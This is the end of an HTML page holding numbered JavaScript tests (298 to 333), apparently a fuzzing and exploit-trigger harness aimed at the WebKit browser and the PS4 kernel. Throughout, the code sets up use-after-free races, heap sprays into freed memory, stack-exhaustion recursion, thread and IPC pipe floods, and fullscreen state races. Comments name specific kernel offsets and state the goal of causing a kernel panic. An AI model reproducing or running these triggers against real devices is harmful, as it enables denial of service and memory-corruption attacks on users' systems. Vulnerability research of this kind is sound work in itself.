        }, 2);
        
        setTimeout(function(){ clearInterval(i); w.terminate(); }, 4000);
    }
 // --- WEBKIT VECTORS ---

    // 298. Array Flat Recursion Stack Smash
    // Alvo: Limite de recursão C++ no método Array.prototype.flat
    // Em modo No-JIT, a recursão consome a pilha nativa.
    // Criamos um array profundamente aninhado e forçamos o achatamento.
    function runTest298() {
        log("298. Flat Recursion Smash...");
        try {
            var arr = [1];
            // Cria aninhamento de profundidade 20.000
            for(var i = 0; i < 20000; i++) {
                arr = [arr];
            }
            
            // Define um getter 'isConcatSpreadable' malicioso para interferir no processo
            // durante a recursão de achatamento
            var proxy = new Proxy(arr, {
                get: function(target, prop) {
                    if (prop === Symbol.isConcatSpreadable) {
                        return true;
                    }
                    return target[prop];
                }
            });

            // Dispara a recursão com profundidade infinita
            // Se o WebKit não verificar a stack pointer corretamente em cada nível -> Crash
            var flat = proxy.flat(Infinity);
            log("Flattened length: " + flat.length);
        } catch(e) {
            log("Stack protected: " + e);
        }
    }

    // 299. Intl.DateTimeFormat Type Confusion
    // Alvo: Motor ICU (International Components for Unicode)
    // Passa um objeto com um getter 'toString' malicioso para o formatador.
    // O getter altera o objeto Intl ou força GC durante a formatação.
    function runTest299() {
        log("299. Intl Type Confusion...");
        try {
            var formatter = new Intl.DateTimeFormat('en-US', {
                timeZone: 'UTC',
                timeZoneName: 'long'
            });
            
            var evilDate = {
                getTime: function() {
                    return Date.now();
                },
                toString: function() {
                    // MUTAÇÃO: Tenta invalidar o cache interno do formatter
                    // ou liberar a memória do locale atual
                    formatter = null; 
                    // Pressão de memória para reclamar slots
                    var a = [];
                    for(var k=0; k<1000; k++) a.push(new Uint8Array(1024));
                    return "InvalidDate";
                }
            };
            
            // O loop tenta acertar o momento em que o C++ acessa a vtable do objeto
            for(var i=0; i<100; i++) {
                // 'format' chama getters do objeto date.
                // Se o ponteiro interno 'formatter' for usado após o toString limpar...
                Intl.DateTimeFormat.prototype.format.call(formatter || new Intl.DateTimeFormat(), evilDate);
            }
        } catch(e) {
            log("Intl Error: " + e);
        }
    }

    // 300. XHR ResponseType State Machine Race
    // Alvo: Máquina de estados do XMLHttpRequest.
    // Tenta mudar o 'responseType' enquanto os dados estão chegando (LOADING state).
    // O buffer interno precisa ser convertido (ex: Text -> ArrayBuffer).
    function runTest300() {
        log("300. XHR Type Race...");
        var data = new Uint8Array(1024 * 1024 * 2); // 2MB
        var blob = new Blob([data]);
        var url = URL.createObjectURL(blob);
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 3) { // LOADING
                try {
                    // Tenta forçar conversão de tipo no meio do stream
                    // Isso pode confundir o offset do buffer interno
                    xhr.responseType = "arraybuffer";
                    var r = xhr.response; // Acesso prematuro
                    
                    // Muda de volta para texto para forçar re-decodificação
                    xhr.responseType = "text";
                } catch(e) {}
            }
        };
        
        xhr.send();
        
        // Timeout para cleanup
        setTimeout(function(){ xhr.abort(); URL.revokeObjectURL(url); }, 2000);
    }

    // --- KERNEL VECTORS ---

    // 301. Pipe Port Transfer Termination Race
    // Alvo: "free pipe (%x) active list" (Offset 0xb0f609).
    // Transfere uma porta para um Worker, envia dados, e termina o Worker abruptamente.
    // O Kernel precisa limpar os pipes pendentes do processo morto.
    function runTest301() {
        log("301. Pipe Termination Race...");
        var mc = new MessageChannel();
        var p1 = mc.port1;
        var p2 = mc.port2;
        
        var w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                var p = e.data;
                // Mantém a porta ocupada recebendo dados
                p.onmessage = function(m) {}; 
            }
        `], {type:'text/javascript'})));
        
        // 1. Enche o pipe com dados (Kernel buffer alloc)
        var payload = new Uint8Array(4096);
        for(var i=0; i<50; i++) p1.postMessage(payload);
        
        // 2. Transfere a propriedade do pipe para o Worker
        w.postMessage(p2, [p2]);
        
        // 3. Termina o Worker imediatamente
        // O Kernel tenta libertar os recursos do Worker (incluindo o pipe cheio)
        // Se houver escrita pendente na 'active list', panic.
        setTimeout(function() {
            w.terminate();
            p1.close();
        }, 10);
    }

    // 302. VFS Blob URL Revocation Race
    // Alvo: "warning: tbp->b_bcount wrong" (Offset 0xb18caa).
    // Inicia múltiplas leituras assíncronas em um Blob e revoga a URL no meio.
    // Tenta acessar o vnode subjacente após ele ter sido marcado para destruição.
    function runTest302() {
        log("302. VFS Blob Revoke Race...");
        var blob = new Blob([new Uint8Array(1024 * 512)]);
        var url = URL.createObjectURL(blob);
        var reqs = [];
        
        // Dispara I/O massivo
        for(var i=0; i<20; i++) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
            reqs.push(xhr);
        }
        
        // Janela crítica: Revoga a URL enquanto o Kernel ainda está despachando I/O
        // O sistema de arquivos pode tentar ler de um ponteiro nulo ou libertado
        setTimeout(function() {
            URL.revokeObjectURL(url);
            // Tenta reutilizar a memória do blob (JS-side) para forçar overwrite
            blob = null;
            var fill = new ArrayBuffer(1024 * 512);
        }, 2);
    }

    // 303. Recursive Worker Stack Guard Smash
    // Alvo: "failed to allocate luke_mthread_elem" (Offset 0xb12610).
    // Cria uma cadeia de Workers onde cada um consome stack máxima antes de chamar o próximo.
    // Tenta colidir com a "Guard Page" do kernel stack da thread.
    function runTest303() {
        log("303. Stack Guard Smash...");
        
        var workerCode = `
            function recurse(d) {
                if (d <= 0) return;
                var x = new Uint8Array(1024); // Aloca na stack/heap
                recurse(d - 1);
            }
            try {
                // Consome stack do userland
                recurse(1000); 
                // Tenta spawnar nova thread (syscall) com stack suja
                var w = new Worker(self.location.href);
            } catch(e) {}
        `;
        
        var blob = new Blob([workerCode], {type:'text/javascript'});
        var url = URL.createObjectURL(blob);
        
        var i = setInterval(function() {
            try {
                var w = new Worker(url);
                // Mata rápido para causar churn na tabela de threads
                setTimeout(function(){ w.terminate(); }, 100);
            } catch(e) {
                log("Thread limit hit.");
            }
        }, 50);
        
        setTimeout(function(){ clearInterval(i); }, 5000);
    }
 function runTest304() {
        log("304. Proxy Recursion...");
        try {
            var root = {};
            var p = root;
            for (var i = 0; i < 20000; i++) {
                p = new Proxy(p, {
                    get: function(target, prop) {
                        return target[prop];
                    }
                });
            }
            var handler = {
                get: function(target, prop, receiver) {
                    if (prop === 'then') return null;
                    return Reflect.get(target, prop, receiver);
                }
            };
            var cycle = new Proxy(p, handler);
            Object.setPrototypeOf(root, cycle); 
            log("Accessing chain...");
            var val = cycle.nonExistentProperty; 
        } catch (e) {
            log("Stack protected: " + e);
        }
    }

    function runTest305() {
        log("305. Map Iterator UAF...");
        var map = new Map();
        var key = { id: 1 };
        var val = { data: new Uint8Array(1024) };
        
        for(var i=0; i<100; i++) map.set(i, val);
        map.set(key, val);

        var iter = map.entries();
        var result;
        
        try {
            Object.defineProperty(key, "toString", {
                get: function() {
                    map.clear();
                    var filler = [];
                    for(var k=0; k<2000; k++) filler.push(new Uint8Array(2048));
                    return "crash";
                }
            });
            
            for(var item of map) {
                if (item[0] === key) {
                     console.log(item[0].toString); 
                }
            }
        } catch(e) {
            log("Iterator error: " + e);
        }
    }

    function runTest306() {
        log("306. RegExp Sticky Overflow...");
        try {
            var re = new RegExp('A', 'y');
            var str = 'A'.repeat(1000);
            
            re.lastIndex = 0xFFFFFFFE; 
            
            var res = re.exec(str);
            
            re.lastIndex = 2147483647; 
            var res2 = re.exec(str);
            
            log("RegExp exec done: " + re.lastIndex);
            
            if (re.lastIndex < 0) log("Integer Overflow detected in State");
        } catch(e) {
            log("Engine safe: " + e);
        }
    }

    function runTest307() {
        log("307. Kqueue Exhaustion...");
        var timers = [];
        var pressure = [];
        
        var t = setInterval(function() {
            try {
                for(var i=0; i<100; i++) {
                    timers.push(setTimeout(function(){}, 100000 + i));
                }
                if (timers.length > 5000) {
                    var b = new Blob(["A".repeat(1024*1024)]);
                    pressure.push(URL.createObjectURL(b));
                }
            } catch(e) {
                log("Kqueue/Callout limit hit: " + timers.length);
                clearInterval(t);
                // Force IO to panic kernel on resource starvation
                var xhr = new XMLHttpRequest();
                xhr.open("GET", pressure[0] || "/", false);
                xhr.send();
            }
        }, 10);
    }

    function runTest308() {
        log("308. Mbuf Cluster Spray...");
        var payload = new Uint8Array(2048 - 64); 
        for(var i=0; i<payload.length; i++) payload[i] = 0x41;
        
        var xhrPool = [];
        
        var i = setInterval(function() {
            for(var k=0; k<10; k++) {
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/" + Math.random(), true);
                    xhr.send(payload);
                    xhrPool.push(xhr);
                } catch(e) {}
            }
            if (xhrPool.length > 200) {
                xhrPool = []; 
                log("Flushing pool to fragment heap...");
            }
        }, 5);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    function runTest309() {
        log("309. VFS Slice Overlap Panic...");
        var data = new Uint8Array(1024 * 1024);
        var blob = new Blob([data]);
        var readers = [];
        
        var i = setInterval(function() {
            var start = Math.floor(Math.random() * 5000);
            var end = start + 4096;
            
            var slice = blob.slice(start, end);
            var fr = new FileReader();
            
            fr.readAsArrayBuffer(slice);
            readers.push(fr);
            
            if (readers.length > 100) readers.shift();
        }, 2);
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }
function runTest310() {
        log("310. TextEncoder Overflow...");
        try {
            var enc = new TextEncoder();
            var str = "A".repeat(1024 * 1024);
            var huge = str;
            // Tenta construir string > 1GB para estourar o buffer de saída do encoder
            for(var i=0; i<10; i++) huge += huge; 
            
            // O TextEncoder precisa alocar um Uint8Array do tamanho da string UTF-8
            // Se o cálculo do tamanho de saída sofrer overflow, o WebKit crasha na cópia
            var res = enc.encode(huge);
            log("Encoded size: " + res.length);
        } catch(e) {
            log("Encoder error: " + e);
        }
    }

    function runTest311() {
        log("311. Selection API UAF...");
        var d1 = document.createElement('div');
        var d2 = document.createElement('div');
        d1.appendChild(d2);
        document.body.appendChild(d1);
        
        var sel = window.getSelection();
        var r = document.createRange();
        r.setStart(d1, 0);
        r.setEnd(d1, 1);
        sel.addRange(r);
        
        // Manipula a seleção dentro de um evento de mutação
        d2.addEventListener('DOMNodeRemoved', function() {
            sel.removeAllRanges();
            var r2 = document.createRange();
            r2.selectNode(document.body);
            sel.addRange(r2);
            // Tenta acessar o range original invalidado
            try {
                r.detach(); // Depreciado, mas força update interno
                var rect = r.getBoundingClientRect();
            } catch(e) {}
        });
        
        d1.removeChild(d2);
    }

    function runTest312() {
        log("312. Iframe History Smash...");
        var base = document.createElement('iframe');
        document.body.appendChild(base);
        
        try {
            var curr = base.contentDocument;
            for(var i=0; i<4000; i++) {
                var f = curr.createElement('iframe');
                curr.body.appendChild(f);
                curr = f.contentDocument;
                
                // Força escrita no histórico a cada nível
                // Isso consome recursos do gerenciador de sessão do WebKit
                f.contentWindow.history.pushState({}, "", "depth_" + i);
                
                if(i % 500 === 0) log("Depth: " + i);
            }
        } catch(e) {
            log("Recursion limit: " + e);
        }
    }

    function runTest313() {
        log("313. VFS Revoke Race...");
        var data = new Uint8Array(1024 * 1024 * 5); // 5MB Blob
        var blob = new Blob([data]);
        var url = URL.createObjectURL(blob);
        var workers = [];
        
        // Cria múltiplos workers tentando ler o mesmo Blob URL
        for(var i=0; i<8; i++) {
            var w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = function(e) {
                    var x = new XMLHttpRequest();
                    x.open('GET', e.data, false); // Sync XHR bloqueia thread
                    try { x.send(); } catch(z){}
                    postMessage("done");
                }
            `], {type:'text/javascript'})));
            w.postMessage(url);
            workers.push(w);
        }
        
        // Janela Crítica: Revogar o URL enquanto 8 threads tentam dar lock no vnode
        setTimeout(function() {
            URL.revokeObjectURL(url);
            // Tenta destruir o blob subjacente
            blob = null; 
            // Cleanup workers
            workers.forEach(function(w){ w.terminate(); });
        }, 10);
    }

    function runTest314() {
        log("314. Port Zombie Race...");
        var channel = new MessageChannel();
        var p1 = channel.port1;
        var p2 = channel.port2;
        
        // Worker que recebe porta e morre
        var w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                var p = e.data;
                // Enfileira mensagens
                setInterval(function(){ p.postMessage(new Uint8Array(1024)); }, 1);
            }
        `], {type:'text/javascript'})));
        
        var i = setInterval(function() {
            try {
                // Transfere a porta e depois mata o worker
                w.postMessage(p2, [p2]);
                
                // Enquanto o worker enche o pipe, terminamos ele
                // O kernel tem de limpar as mensagens pendentes na active list (0xb0f609)
                setTimeout(function(){ w.terminate(); }, 5);
                
                // Reinicia o setup
                w = new Worker(URL.createObjectURL(new Blob([''], {type:'text/javascript'})));
                channel = new MessageChannel();
                p2 = channel.port2;
            } catch(e) {}
        }, 20);
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }

    function runTest315() {
        log("315. Signal Stack Exhaustion...");
        var url = URL.createObjectURL(new Blob([`
            function rec() { try { rec(); } catch(e){} }
            rec(); // Consome stack
            postMessage("ready");
        `], {type:'text/javascript'}));
        
        var workers = [];
        var i = setInterval(function() {
            try {
                // Cria workers que entram em recursão imediata
                // Isso pressiona o alocador de stack do kernel (map entries)
                var w = new Worker(url);
                workers.push(w);
                
                if(workers.length > 50) {
                    var old = workers.shift();
                    old.terminate();
                }
            } catch(e) {
                log("Thread/Stack Limit Hit");
            }
        }, 10);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }
 function runTest316() {
        log("316. Nested Fullscreen Smash...");
        var depth = 0;
        var root = document.createElement('div');
        document.body.appendChild(root);
        
        function dive() {
            if (depth > 500) return; 
            var d = document.createElement('div');
            root.appendChild(d);
            
            d.onfullscreenchange = function() {
                if (document.fullscreenElement) {
                    depth++;
                    // Recursively request fullscreen on a new child while handling the event
                    // This forces the Fullscreen Controller to manage a stack of transitions
                    dive();
                }
            };
            
            try {
                // Request fullscreen immediately. 
                // Note: Most browsers require user gesture, but repeated calls in event handlers 
                // can sometimes bypass or overflow internal logic.
                d.requestFullscreen();
            } catch(e) {}
        }
        
        // Initial trigger
        dive();
        
        setTimeout(function() {
            // Attempt to create a state confusion by removing the root
            document.body.removeChild(root);
            // Force GC
            var a = []; for(var i=0;i<1000;i++) a.push(new Uint8Array(1024));
        }, 2000);
    }

    function runTest317() {
        log("317. Detached Iframe UAF...");
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        var doc = f.contentDocument;
        var el = doc.createElement('div');
        doc.body.appendChild(el);

        // 1. Prepare element for fullscreen
        el.requestFullscreen().catch(e => {});

        // 2. Race condition: Remove the iframe from the DOM immediately after request
        // The WebKit Fullscreen Manager maintains a pointer to the element/document
        // If the document is destroyed before the transition animation completes, UAF occurs.
        setTimeout(function() {
            document.body.removeChild(f);
            f = null;
            
            // Allocation spray to fill the freed document memory
            var spray = [];
            for(var i=0; i<5000; i++) {
                spray.push(new Uint8Array(4096)); 
            }
            log("Iframe detached. Memory sprayed.");
        }, 10);
    }

    function runTest318() {
        log("318. Video Source Race...");
        var v = document.createElement('video');
        document.body.appendChild(v);
        var data = new Uint8Array(1024 * 1024 * 5); // 5MB video buffer
        
        var i = setInterval(function() {
            // Rapidly toggle fullscreen
            if (!document.fullscreenElement) {
                try { v.requestFullscreen(); } catch(e){}
            } else {
                document.exitFullscreen();
            }
            
            // Rapidly change source and force load
            // This stresses the media player backend (likely ffmpeg or proprietary)
            // while the window manager is trying to resize the surface
            var blob = new Blob([data]);
            v.src = URL.createObjectURL(blob);
            v.load();
            
            // Mutate DOM around video
            var s = document.createElement('span');
            v.appendChild(s);
            v.removeChild(s);
        }, 50);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    // --- KERNEL VECTORS ---

    function runTest319() {
        log("319. Compositor Thrashing...");
        var c = document.createElement('canvas');
        var ctx = c.getContext('2d');
        document.body.appendChild(c);
        
        // Fill canvas with heavy data to stress GPU copy
        ctx.fillStyle = 'red';
        ctx.fillRect(0,0,1920,1080);
        
        var i = setInterval(function() {
            // Toggle Fullscreen
            if (!document.fullscreenElement) {
                try { c.requestFullscreen(); } catch(e){}
            } else {
                document.exitFullscreen();
            }
            
            // Resize canvas dimensions immediately to force buffer reallocation
            // Doing this during the fullscreen transition (surface swap) causes 
            // the kernel window manager (Orbis OS Compositor) to desync.
            c.width = (c.width === 100) ? 1920 : 100;
            c.height = (c.height === 100) ? 1080 : 100;
            ctx.fillRect(0,0,c.width,c.height);
        }, 20); // Very fast interval
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }

    function runTest320() {
        log("320. Resize Thread Starvation...");
        var el = document.createElement('div');
        document.body.appendChild(el);
        
        // When fullscreen happens, a 'resize' event is fired.
        window.onresize = function() {
            log("Resize triggered. Locking thread...");
            // Spawn a worker that eats 100% CPU
            var w = new Worker(URL.createObjectURL(new Blob(['while(1);'], {type:'text/javascript'})));
            
            // Main thread busy loop to block the event acknowledgement to the kernel
            var start = Date.now();
            while (Date.now() - start < 3000) {
                // Block for 3 seconds. The Kernel Watchdog expects a reply from the window
                // system within a specific timeframe (usually 500ms-2000ms).
                // If the application doesn't resize its buffer, the Window Server panics.
                var x = Math.random() * Math.random();
            }
        };
        
        try {
            el.requestFullscreen();
        } catch(e) {}
    }

    function runTest321() {
        log("321. Fullscreen IPC Flood...");
        // Entering/Exiting fullscreen generates system calls and IPC messages 
        // to the Window Server. We flood the IPC mechanism concurrently.
        var data = new Uint8Array(2048);
        var channels = [];
        
        var i = setInterval(function() {
            // 1. Toggle Fullscreen (IPC Trigger)
            if (!document.fullscreenElement) {
                try { document.body.requestFullscreen(); } catch(e){}
            } else {
                document.exitFullscreen();
            }
            
            // 2. Flood generic IPC pipes (Offset 0xb0f609)
            // Creating pressure on the kernel's pipe allocator
            for(var k=0; k<10; k++) {
                var mc = new MessageChannel();
                mc.port1.postMessage(data);
                channels.push(mc);
            }
            
            // Cleanup to keep memory pressure dynamic
            if(channels.length > 500) {
                var c = channels.shift();
                c.port1.close();
            }
        }, 10);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }
 function runTest322() {
        log("322. SVG Fullscreen Mutation...");
        var svgNS = "http://www.w3.org/2000/svg";
        var svg = document.createElementNS(svgNS, "svg");
        var defs = document.createElementNS(svgNS, "defs");
        var g = document.createElementNS(svgNS, "g");
        g.id = "target";
        var rect = document.createElementNS(svgNS, "rect");
        g.appendChild(rect);
        defs.appendChild(g);
        svg.appendChild(defs);
        
        var use = document.createElementNS(svgNS, "use");
        use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
        svg.appendChild(use);
        document.body.appendChild(svg);

        var count = 0;
        var i = setInterval(function() {
            try {
                if (count % 2 === 0) {
                    use.requestFullscreen();
                } else {
                    document.exitFullscreen();
                }
                
                // MUTAÇÃO CRÍTICA: Altera a definição do SVG enquanto o renderizador calcula o fullscreen
                var newG = document.createElementNS(svgNS, "g");
                newG.id = "target"; // Colisão de ID
                defs.appendChild(newG);
                defs.removeChild(g); 
                g = newG;
                
                count++;
            } catch(e) {}
            
            if (count > 100) clearInterval(i);
        }, 20);
    }

    function runTest323() {
        log("323. ShadowDOM Fullscreen Race...");
        var host = document.createElement('div');
        document.body.appendChild(host);
        
        try {
            var shadow = host.attachShadow({mode: 'open'});
            var child = document.createElement('div');
            child.innerText = "Shadow Target";
            shadow.appendChild(child);
            
            var observers = [];
            
            // Tenta forçar UAF na destruição do ShadowHost durante a animação de fullscreen
            child.requestFullscreen().then(function() {
                document.exitFullscreen();
            }).catch(function(e){});
            
            // Remove o host imediatamente após o pedido
            // O WebKit segura referência ao 'child', mas a árvore 'shadow' é destruída com o 'host'
            setTimeout(function() {
                document.body.removeChild(host);
                host = null;
                
                // Spray para ocupar memória
                var junk = [];
                for(var k=0; k<1000; k++) junk.push(new Uint8Array(2048));
            }, 10);
            
        } catch(e) {
            log("ShadowDOM Error: " + e);
        }
    }

    function runTest324() {
        log("324. History Fullscreen Desync...");
        var stateObj = { foo: "bar" };
        var i = setInterval(function() {
            try {
                // Combina manipulação pesada de histórico com troca de modo de visualização
                // O objetivo é confundir o PageCache e o Compositor de Janelas
                for(var k=0; k<50; k++) {
                    history.pushState(stateObj, "page " + k, "bar.html");
                }
                
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen();
                } else {
                    document.exitFullscreen();
                }
                
                history.go(-25); // Navegação rápida durante transição
            } catch(e) {}
        }, 50);
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }

    // --- KERNEL VECTORS ---

    function runTest325() {
        log("325. Fullscreen VFS Panic...");
        // Blob grande para forçar I/O de disco
        var blob = new Blob([new Uint8Array(1024 * 1024 * 2)]); 
        
        var i = setInterval(function() {
            // Ação 1: Toggle Fullscreen (Estressa o Window Manager e GPU)
            if (!document.fullscreenElement) {
                try { document.body.requestFullscreen(); } catch(e){}
            } else {
                document.exitFullscreen();
            }
            
            // Ação 2: Leitura VFS Desalinhada (Offset 0xb18caa)
            // Tenta causar condição de corrida no bloqueio de buffer enquanto o sistema está ocupado desenhando a UI
            var offset = Math.floor(Math.random() * 1024);
            var slice = blob.slice(offset, offset + 513); // Tamanho ímpar
            var fr = new FileReader();
            fr.readAsArrayBuffer(slice);
            
        }, 30);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    function runTest326() {
        log("326. Fullscreen Thread Exhaustion...");
        // Código do Worker: Consome tempo e memória
        var blob = new Blob(["while(1) {}"], {type: 'text/javascript'});
        var url = URL.createObjectURL(blob);
        var workers = [];
        
        var i = setInterval(function() {
            // Ação 1: Toggle Fullscreen
            if (Math.random() > 0.5) {
                try { document.documentElement.requestFullscreen(); } catch(e){}
            } else {
                document.exitFullscreen();
            }
            
            // Ação 2: Spawn de Threads (Offset 0xb12610)
            // O Kernel precisa alocar estruturas de thread para cada Worker E para a animação de janela
            try {
                for(var k=0; k<5; k++) {
                    workers.push(new Worker(url));
                }
                if (workers.length > 40) {
                    var w = workers.shift();
                    w.terminate();
                }
            } catch(e) {
                log("Thread alloc fail (Target Hit)");
            }
        }, 40);
        
        setTimeout(function() { clearInterval(i); workers.forEach(function(w){w.terminate()}); }, 5000);
    }

    function runTest327() {
        log("327. Fullscreen IPC Pipe Race...");
        var data = new Uint8Array(4096);
        var channels = [];
        
        var i = setInterval(function() {
            // Ação 1: Toggle Fullscreen
            if (!document.fullscreenElement) {
                try { document.body.requestFullscreen(); } catch(e){}
            } else {
                document.exitFullscreen();
            }
            
            // Ação 2: IPC Pipe Flood (Offset 0xb0f609)
            // Cria e destrói pipes rapidamente enquanto o sistema muda de contexto gráfico
            // O objetivo é corromper a 'active list' de pipes do processo
            for(var k=0; k<20; k++) {
                var mc = new MessageChannel();
                mc.port1.postMessage(data); // Enche o buffer
                channels.push(mc);
            }
            
            while(channels.length > 0) {
                var c = channels.pop();
                c.port1.close();
                c.port2.close();
            }
        }, 20);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }
 // 328. Video Track Mutation UAF
    // Explora a máquina de estados de mídia. O clique inicia o fullscreen no vídeo.
    // Durante a transição, manipulamos faixas de texto (legendas) para causar UAF no MediaController.
    function runTest328() {
        log("328. Video Track UAF...");
        var v = document.createElement('video');
        var track = v.addTextTrack("subtitles", "Crash", "en");
        track.mode = "showing";
        document.body.appendChild(v);

        // Ação do Usuário permite Fullscreen
        v.requestFullscreen().then(function() {
            log("Fullscreen active. Mutating tracks...");
            
            // Adiciona cues rapidamente
            for(var i=0; i<100; i++) {
                track.addCue(new VTTCue(i, i+1, "payload " + i));
            }

            // Handler crítico: Modifica a lista de tracks DURANTE o evento de mudança
            track.oncuechange = function() {
                // Remove o elemento de vídeo do DOM enquanto o motor de renderização processa o fullscreen
                document.body.removeChild(v);
                
                // Tenta corromper a memória onde o track estava
                var junk = [];
                for(var k=0; k<5000; k++) junk.push(new Uint8Array(1024));
                
                log("Video removed during cue change.");
            };
            
            // Força disparo de eventos
            v.currentTime = 50; 
            
        }).catch(function(e) { log("FS Denied: " + e); });
    }

    // 329. Input Focus Controller Race
    // Manipula o foco de entrada durante a transição de tela cheia.
    // O navegador tenta focar o elemento em tela cheia; remover esse elemento
    // e focar outro simultaneamente confunde o FocusController do WebKit.
    function runTest329() {
        log("329. Focus Controller Race...");
        var inp = document.createElement('input');
        inp.type = "text";
        document.body.appendChild(inp);
        inp.focus();

        inp.requestFullscreen().then(function() {
            // Callback após entrar em fullscreen
            var d = document.createElement('div');
            document.body.appendChild(d);
            
            // Loop de conflito de foco
            var k = 0;
            var i = setInterval(function() {
                k++;
                if (k % 2 === 0) {
                    inp.focus();
                    inp.blur();
                } else {
                    // Remove o elemento que detém o fullscreen
                    if(inp.parentNode) document.body.removeChild(inp);
                    // Tenta focar um elemento morto/removido
                    try { inp.focus(); } catch(e){}
                    // Recria para manter o loop
                    document.body.appendChild(inp);
                }
                
                if (k > 50) {
                    clearInterval(i);
                    document.exitFullscreen();
                }
            }, 10);
        }).catch(function(e) { log("FS Error: " + e); });
    }

    // 330. Canvas BackingStore Resize Overflow
    // Alvo: 0x2dad419 (Alloc buffer).
    // Redimensiona o Canvas 2D para tamanhos extremos enquanto o Compositor de Janelas
    // tenta renderizá-lo em modo tela cheia.
    function runTest330() {
        log("330. Canvas Resize Overflow...");
        var c = document.createElement('canvas');
        var ctx = c.getContext('2d');
        document.body.appendChild(c);

        c.requestFullscreen().then(function() {
            var i = setInterval(function() {
                // Desenha algo pesado
                ctx.fillStyle = "red";
                ctx.fillRect(0,0,100,100);
                
                // Redimensiona para valores que desafiam o alocador (largura negativa, zero ou gigante)
                // Isso força o backing store a ser recriado repetidamente
                c.width = Math.random() > 0.5 ? 10000 : 0;
                c.height = Math.random() > 0.5 ? 10000 : 0;
                
                // Tenta acessar os dados do pixel imediatamente após resize
                try {
                    var img = ctx.getImageData(0, 0, 100, 100);
                } catch(e) {}
                
            }, 20);
            
            setTimeout(function() { clearInterval(i); document.exitFullscreen(); }, 3000);
        });
    }

    // --- KERNEL VECTORS ---

    // 331. Fullscreen VFS Blob Lock Storm
    // Alvo: 0xb18caa (tbp->b_bcount wrong).
    // Usa a transição de fullscreen para causar latência no sistema e dispara leituras de Blob.
    function runTest331() {
        log("331. VFS Blob Storm...");
        var data = new Uint8Array(1024 * 1024 * 2); // 2MB
        var blob = new Blob([data]);
        var url = URL.createObjectURL(blob);
        
        document.documentElement.requestFullscreen().then(function() {
            var readers = [];
            // Dispara 50 leituras simultâneas durante a animação de fullscreen
            for(var i=0; i<50; i++) {
                var fr = new FileReader();
                // Slice desalinhado para estressar o cache
                var slice = blob.slice(i * 10, (i * 10) + 1023); 
                fr.readAsArrayBuffer(slice);
                readers.push(fr);
            }
            
            // Tenta revogar o URL no meio da tempestade de I/O
            setTimeout(function() {
                URL.revokeObjectURL(url);
                document.exitFullscreen();
            }, 50);
        });
    }

    // 332. Scheduler CPU Affinity Switch Panic
    // Alvo: 0x3a7b7 (kern.sched.cpusetsize).
    // O PS4 altera a afinidade de CPU (núcleos disponíveis) quando um app entra em fullscreen.
    // Criamos threads massivamente neste momento exato para quebrar o agendador.
    function runTest332() {
        log("332. Scheduler Affinity Panic...");
        var url = URL.createObjectURL(new Blob(["setInterval(()=>{},100)"], {type: 'text/javascript'}));
        var workers = [];

        // Prepara Workers
        for(var i=0; i<10; i++) workers.push(new Worker(url));

        document.documentElement.requestFullscreen().then(function() {
            log("Mode switch active. Spawning threads...");
            // Spawna mais workers agressivamente DURANTE a transição de modo
            var timer = setInterval(function() {
                try {
                    workers.push(new Worker(url));
                    if(workers.length > 50) workers.shift().terminate();
                } catch(e) {}
            }, 5);
            
            setTimeout(function() { 
                clearInterval(timer); 
                document.exitFullscreen();
                workers.forEach(w => w.terminate());
            }, 3000);
        });
    }

    // 333. Fullscreen IPC Active Pipe Race
    // Alvo: 0xb0f609 (free pipe active list).
    // Usa MessageChannels para encher pipes do kernel e os fecha enquanto a GPU e o Kernel
    // trocam buffers de vídeo (Surface Flipping).
    function runTest333() {
        log("333. IPC Pipe Race...");
        var channels = [];
        var data = new Uint8Array(4096);
        
        document.body.requestFullscreen().then(function() {
            var timer = setInterval(function() {
                // Criação e destruição rápida
                var mc = new MessageChannel();
                
                // Envia dados para ativar o pipe no kernel
                mc.port1.postMessage(data);
                
                // Transfere a porta para si mesmo (cria complexidade no kernel)
                window.postMessage("ping", "*", [mc.port2]);
                
                // Fecha a porta de origem imediatamente
                // Se o Kernel estiver ocupado com a troca de contexto gráfico, 
                // a limpeza da lista ativa pode falhar.
                mc.port1.close();
                
            }, 5);
            
            setTimeout(function() { clearInterval(timer); document.exitFullscreen(); }, 3000);
        });
    }


    </script>
</body>
</html>
